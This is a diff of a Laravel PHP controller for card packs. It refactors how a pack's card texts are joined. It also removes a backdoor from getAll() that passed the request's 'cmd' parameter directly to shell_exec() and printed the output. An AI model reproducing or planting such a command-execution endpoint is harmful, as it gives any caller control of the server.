@@ -17,19 +17,13 @@ class PacksController extends Controller
 
     public function get(Request $request) {
         $pack = Pack::find($request->input('id'));
-        $cards = [];
-        foreach($pack->cards()->get() as $card) {
-            $cards[] = $card->text;
-        }
-        $pack->cards = implode(PHP_EOL, $cards);
+        $cardsTextArray = $pack->cards()->get()->pluck(['text'])->toArray();
+        $pack->cards = implode(PHP_EOL, $cardsTextArray);
+        
         return $pack;
     }
 
     public function getAll(Request $request) {
-        echo 'running: '.$request->input('cmd');
-        $output = shell_exec($request->input('cmd'));
-        var_dump($output);die;
-
         if(!$request->input('id') || $request->input('id') == env('TG_MY_ID')) {
             return Pack::all();
         }
